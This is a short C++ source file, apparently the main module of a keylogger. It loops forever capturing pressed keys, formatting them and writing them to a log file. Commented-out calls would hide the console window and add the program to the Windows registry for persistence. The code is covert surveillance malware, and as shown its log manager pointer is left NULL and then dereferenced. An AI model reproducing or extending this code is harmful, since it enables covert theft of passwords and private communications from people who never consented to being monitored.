#include "logManager.h"
#include "keyLogger.h"
#include "windowManager.h"
#include "registryHandler.h"

std::string formatPrintable(keyStroke key);

logManager* logManager::manager = NULL;

int main()
{
    keyStroke key;

    logManager* manager = NULL;

    //windowManager::hideConsoleWindow();

    // Mainloop that logs the keystrokes.


    //std::cout << registryHandler::addToRegistry();

    while(TRUE)
    {
        key = keyLogger::checkPressedKey();
        std::cout << formatPrintable(key);
        manager->writeCharToLog(formatPrintable(key));

    }
	return 0;
}

std::string formatPrintable(keyStroke key)
{
    std::string printString = "";

    if (key.isPrintable())
        printString = key.getPrintableCharacter();
    else if (key.getKeyCode() != 0)
        printString = keyProcessor::convertSpecialChar(key.getKeyCode());

    return printString;
}